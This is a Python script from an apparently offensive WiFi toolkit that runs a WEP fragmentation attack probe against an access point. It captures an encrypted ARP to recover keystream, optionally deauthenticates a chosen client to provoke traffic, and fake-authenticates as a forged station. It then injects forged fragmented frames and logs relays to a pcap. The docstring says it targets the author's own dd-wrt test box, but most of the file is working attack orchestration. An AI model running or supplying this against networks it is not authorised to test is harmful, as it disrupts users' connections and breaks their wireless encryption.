"""WEP fragmentation ORACLE probe (M5 — hardware ground truth).

The crypto for fragmentation is built + offline-verified (wep_crypto.py); the
ONLY unknown left is hardware behavior: **does the target AP reassemble our
fragmented frames and relay the result on the air**, and if so, what does that
relayed frame look like? You can't answer that offline — so this probe gets
real packets, the same spec+pcap model we use for driver porting.

What it does (against the dd-wrt WEP box on ch 6, key abcde):
  1. Discover the card, park on the target channel, find the WEP AP.
  2. Capture one broadcast WEP ARP → derive an 8-byte keystream seed + its IV
     (the fixed LLC/SNAP+ethertype prefix is the known plaintext).
  3. Fake-auth (associate) so the AP will accept frames from our STA.
  4. Fragment a known-plaintext broadcast ARP into ≤16 tiny fragments under the
     seed keystream, and inject the round in a short loop.
  5. Dump EVERY received frame (timestamped) to a .pcap + a readable console
     log, FLAGGING any candidate relay — a fresh-IV broadcast WEP data frame
     whose source is our forged STA, appearing after a burst.

Then we read the pcap together and write the real oracle (fragmentation.py) to
what the box actually does. This probe TRANSMITS (fragments + fake-auth), so
it's an explicit, run-it-yourself tool — never part of passive operation.

Usage (at the box):
    uv run python scripts/wep/frag_probe.py --bssid AA:BB:CC:DD:EE:FF
    uv run python scripts/wep/frag_probe.py --ssid MyWepNet --channel 6
    uv run python scripts/wep/frag_probe.py --bssid ... --provoke 11:22:...:66
    # add --debug for verbose USB/driver logs
"""
from __future__ import annotations

import argparse
import asyncio
import logging
import struct
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent / "src"))

from wifit3.engine.attacks.wep.fake_auth import WepFakeAuth
from wifit3.engine.attacks.wep.wep_crypto import (
    arp_request_plaintext,
    build_fragments,
    seed_keystream_from_arp,
)
from wifit3.wlan.manager import WlanDeviceManager

# ---- console helpers (match the test_hw_* aesthetic) -----------------------


def step(label: str) -> None:
    print(f"\n--- {label} ---")


def ok(msg: str) -> None:
    print(f"[PASS] {msg}")


def info(msg: str) -> None:
    print(f"  {msg}")


def fail(msg: str) -> None:
    print(f"[FAIL] {msg}")
    sys.exit(1)


def _mac(b: bytes) -> str:
    return ":".join(f"{x:02x}" for x in b)


def _str_to_mac(s: str) -> bytes:
    return bytes(int(x, 16) for x in s.split(":"))


# ---- self-contained pcap writer --------------------------------------------
# Deliberately NOT reusing src/wifit3/engine/pcap.py: that one stamps every
# frame with a single timestamp, but for a probe the send/relay ORDERING is the
# whole point. Duplicating ~15 lines keeps this throwaway script independent of
# future refactors of the shared writer.

_LINKTYPE_IEEE802_11 = 105


def write_pcap(path: Path, frames: list) -> int:
    """frames: list of (ts_float, raw_bytes). Standard libpcap, linktype 105."""
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("wb") as f:
        f.write(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535,
                            _LINKTYPE_IEEE802_11))
        for ts, frame in frames:
            sec = int(ts)
            usec = int((ts - sec) * 1_000_000)
            f.write(struct.pack("<IIII", sec, usec, len(frame), len(frame)))
            f.write(frame)
    return len(frames)


# ---- 802.11 header inspection (raw, no parser coupling) --------------------


def _hdr_len(fc0: int, fc1: int) -> int:
    """Bytes of MAC header before the WEP body, mirroring arp_replay's logic."""
    n = 24
    if (fc1 & 0x01) and (fc1 & 0x02):   # ToDS+FromDS → 4-address (WDS)
        n += 6
    if ((fc0 & 0xF0) >> 4) & 0x08:      # QoS data subtype
        n += 2
    if fc1 & 0x80:                      # HT Control (Order bit)
        n += 4
    return n


def _wep_body(captured: bytes) -> bytes | None:
    """Extract IV(3)+KeyID(1)+cipher+ICV from a full captured 802.11 frame."""
    if len(captured) < 28:
        return None
    body = captured[_hdr_len(captured[0], captured[1]):]
    return body if len(body) >= 8 else None


def _describe(frame: bytes) -> str:
    """One-line human summary of a frame for the console log."""
    if len(frame) < 10:
        return f"len={len(frame)} (runt)"
    fc0, fc1 = frame[0], frame[1]
    ftype = (fc0 >> 2) & 0x03
    subtype = (fc0 & 0xF0) >> 4
    kind = {0: "mgmt", 1: "ctrl", 2: "data", 3: "ext"}[ftype]
    flags = []
    if fc1 & 0x01:
        flags.append("ToDS")
    if fc1 & 0x02:
        flags.append("FromDS")
    if fc1 & 0x40:
        flags.append("Prot")
    a1 = _mac(frame[4:10])
    a2 = _mac(frame[10:16]) if len(frame) >= 16 else "?"
    a3 = _mac(frame[16:22]) if len(frame) >= 22 else "?"
    iv = ""
    if ftype == 2 and (fc1 & 0x40):
        body = frame[_hdr_len(fc0, fc1):]
        if len(body) >= 3:
            iv = f" iv={body[:3].hex()}"
    return (f"{kind}/{subtype:#04x} [{','.join(flags) or '-'}] len={len(frame)} "
            f"a1={a1} a2={a2} a3={a3}{iv}")


# ---- the probe -------------------------------------------------------------


class FragProbe:
    def __init__(self, iface, bssid: str, source_mac: bytes, seed_iv: bytes):
        self.iface = iface
        self.bssid = bssid.lower()
        self.bssid_bytes = _str_to_mac(self.bssid)
        self.source_mac = source_mac
        self.seed_iv = seed_iv
        # Buffered (ts, frame) for the pcap. list.append is GIL-atomic, so it's
        # safe whether the driver RX loop fires us from the event loop or a
        # background USB-reader thread.
        self.captured: list = []
        self.relays: list = []          # candidate reassembled relays
        self._burst_active = False

    def rx_cb(self, frame: bytes, rssi: int, ts: float) -> None:
        self.captured.append((ts, bytes(frame)))
        if len(frame) < 24:
            return
        fc0, fc1 = frame[0], frame[1]
        # Candidate relay: a FromDS (AP-sourced), Protected DATA frame, sent to
        # broadcast, whose SA (Addr3 under FromDS) is our forged STA, carrying a
        # FRESH IV (the AP re-encrypted our reassembled ARP). Flag generously —
        # we'd rather over-report here and filter when reading the pcap.
        is_data = ((fc0 >> 2) & 0x03) == 2
        if not (is_data and (fc1 & 0x40) and (fc1 & 0x02) and not (fc1 & 0x01)):
            return
        da, sa = frame[4:10], frame[16:22]
        if da != b"\xff" * 6:
            return
        body = frame[_hdr_len(fc0, fc1):]
        if len(body) < 4:
            return
        iv = body[:3]
        looks_ours = sa == self.source_mac
        fresh_iv = iv != self.seed_iv
        if looks_ours or fresh_iv:
            tag = []
            if looks_ours:
                tag.append("SA=us")
            if fresh_iv:
                tag.append("fresh-IV")
            self.relays.append((ts, bytes(frame), self._burst_active, tag))


async def discover_iface(debug: bool):
    mgr = WlanDeviceManager()
    ifaces = await mgr.refresh()
    if not ifaces:
        fail("No supported wifit3 card found. Plug it in (Zadig→WinUSB on "
             "Windows) and retry.")
    iface = ifaces[0]
    info(f"Using {iface.name}: {iface.description}")
    okc = await iface.connect(progress_cb=lambda p, m: None)
    if not okc:
        fail("Driver connect() failed — replug and retry.")
    return mgr, iface


async def find_ap(iface, channel: int, bssid: str | None, ssid: str | None,
                  scan_s: float):
    step(f"Park on channel {channel}, find the WEP AP")
    if not await iface.set_channel(channel):
        fail(f"set_channel({channel}) failed.")
    deadline = time.time() + scan_s
    target = None
    while time.time() < deadline:
        for ap in iface.get_access_points():
            if bssid and ap.bssid.lower() != bssid.lower():
                continue
            if ssid and (ap.ssid or "") != ssid:
                continue
            if (ap.encryption or "").upper() == "WEP" or bssid:
                target = ap
                break
        if target:
            break
        await asyncio.sleep(0.5)
    if not target:
        fail(f"No matching WEP AP seen in {scan_s:.0f}s on ch {channel}. "
             "Check --bssid/--ssid/--channel and that the box is up.")
    info(f"Target: {target.bssid}  ssid={target.ssid!r}  enc={target.encryption}")
    if (target.encryption or "").upper() != "WEP":
        info(f"[warn] encryption reads {target.encryption!r}, not WEP — "
             "continuing because you named it explicitly.")
    return target


async def capture_seed_arp(iface, bssid: str, wait_s: float, provoke: str | None):
    step("Capture a broadcast WEP ARP (the keystream seed)")
    info("Waiting for a broadcast WEP ARP. Generate LAN traffic on the box "
         "(e.g. ping the gateway from a client) if none appears.")
    if provoke:
        info(f"Provoking: deauthing {provoke} to trigger ARP retransmits.")
        await iface.deauth(bssid, provoke, burst_count=8)
    deadline = time.time() + wait_s
    while time.time() < deadline:
        cands = iface.wep_store.arp_candidates(bssid)
        if cands:
            captured = cands[-1]
            body = _wep_body(captured)
            if body:
                ok(f"Got an ARP seed: {len(captured)}-byte frame, "
                   f"IV={body[:3].hex()}")
                return captured, body
        await asyncio.sleep(0.5)
    fail(f"No broadcast WEP ARP in {wait_s:.0f}s "
         f"({iface.wep_store.arp_seen_count(bssid)} broadcast frames seen). "
         "Try --provoke <client_mac> or generate ARP traffic on the LAN.")


async def main_async(args) -> int:
    mgr, iface = await discover_iface(args.debug)
    try:
        target = await find_ap(iface, args.channel, args.bssid, args.ssid,
                               args.scan_secs)
        captured, seed_body = await capture_seed_arp(
            iface, target.bssid, args.arp_wait_secs, args.provoke
        )
        seed_iv = seed_body[:3]
        seed_ks = seed_keystream_from_arp(seed_body, want=8)
        info(f"Seed keystream (8 B) for IV {seed_iv.hex()}: {seed_ks.hex()}")

        step("Fake-auth (associate as a forged STA)")
        fake_auth = WepFakeAuth(iface, target, log_callback=lambda m: info(m))
        fake_auth.start()
        deadline = time.time() + args.assoc_wait_secs
        while time.time() < deadline and fake_auth.state != "associated":
            await asyncio.sleep(0.2)
        if fake_auth.state != "associated":
            fake_auth.stop()
            fail(f"Could not associate (state={fake_auth.state}). The AP may be "
                 "out of range or filtering — retry closer.")
        ok(f"Associated as {_mac(fake_auth.source_mac)}")

        # Build the fragmented broadcast ARP (known plaintext).
        payload = arp_request_plaintext(
            sender_mac=fake_auth.source_mac,
            sender_ip=bytes(int(x) for x in args.sender_ip.split(".")),
            target_ip=bytes(int(x) for x in args.target_ip.split(".")),
        )
        frags = build_fragments(
            seed_ks, seed_iv, payload,
            bssid=_str_to_mac(target.bssid),
            source_mac=fake_auth.source_mac,
            dest_mac=b"\xff" * 6,
        )
        info(f"Built {len(frags)} fragments "
             f"({len(seed_ks) - 4} data bytes each) of a {len(payload)}-byte ARP")

        probe = FragProbe(iface, target.bssid, fake_auth.source_mac, seed_iv)
        iface.register_rx_callback(probe.rx_cb)

        step(f"Inject fragment rounds for {args.inject_secs:.0f}s "
             f"(dumping ALL RX)")
        rounds = 0
        end = time.time() + args.inject_secs
        try:
            while time.time() < end:
                probe._burst_active = True
                for fr in frags:
                    await iface.send_raw(fr, use_no_ack=True)
                probe._burst_active = False
                rounds += 1
                await asyncio.sleep(args.round_gap)   # RX window for the relay
        finally:
            iface.unregister_rx_callback(probe.rx_cb)
            fake_auth.stop()

        info(f"Sent {rounds} fragment rounds ({rounds * len(frags)} fragments).")

        # ---- report --------------------------------------------------------
        step("Results")
        out = Path(args.out)
        n = write_pcap(out, probe.captured)
        info(f"Captured {n} frames → {out}")
        if probe.relays:
            ok(f"{len(probe.relays)} CANDIDATE RELAY frame(s) seen — the AP may "
               "be reassembling! Sample(s):")
            for ts, fr, during, tag in probe.relays[:8]:
                when = "during-burst" if during else "post-burst"
                print(f"    [{when}] {','.join(tag):<16} {_describe(fr)}")
            print("\n  → Read the .pcap to confirm the relay matches our ARP "
                  "and code fragmentation.py's oracle to it.")
        else:
            info("No candidate relay seen. That's a real datapoint, not "
                 "necessarily failure — could be: this AP doesn't reassemble, "
                 "the round didn't land, or it relays differently than the "
                 "FromDS/broadcast/SA=us hypothesis. Inspect the .pcap for ANY "
                 "fresh-IV broadcast data frame right after a burst.")
        ok("Probe complete — pcap is the ground truth.")
        return 0
    finally:
        step("Release device")
        await mgr.close_all()
        info("Closed.")


def main() -> int:
    p = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    p.add_argument("--bssid", help="target AP BSSID (preferred selector)")
    p.add_argument("--ssid", help="target AP SSID (if BSSID unknown)")
    p.add_argument("--channel", type=int, default=6, help="target channel (dd-wrt box = 6)")
    p.add_argument("--provoke", help="deauth this client MAC to provoke an ARP")
    p.add_argument("--sender-ip", default="192.168.1.123", help="forged ARP sender IP")
    p.add_argument("--target-ip", default="192.168.1.1", help="forged ARP target IP")
    p.add_argument("--scan-secs", type=float, default=8.0)
    p.add_argument("--arp-wait-secs", type=float, default=30.0)
    p.add_argument("--assoc-wait-secs", type=float, default=8.0)
    p.add_argument("--inject-secs", type=float, default=10.0)
    p.add_argument("--round-gap", type=float, default=0.2, help="RX window between rounds")
    p.add_argument("--out", default="wifit3-wep-frag.pcap", help="pcap output path")
    p.add_argument("--debug", action="store_true", help="verbose USB/driver logging")
    args = p.parse_args()

    if not args.bssid and not args.ssid:
        p.error("give --bssid (preferred) or --ssid to pick the target")

    logging.basicConfig(
        level=logging.DEBUG if args.debug else logging.WARNING,
        format="%(asctime)s.%(msecs)03d [%(levelname)-5s] %(name)s: %(message)s",
        datefmt="%H:%M:%S",
    )
    try:
        return asyncio.run(main_async(args))
    except KeyboardInterrupt:
        print("\n[interrupted]")
        return 1


if __name__ == "__main__":
    sys.exit(main())
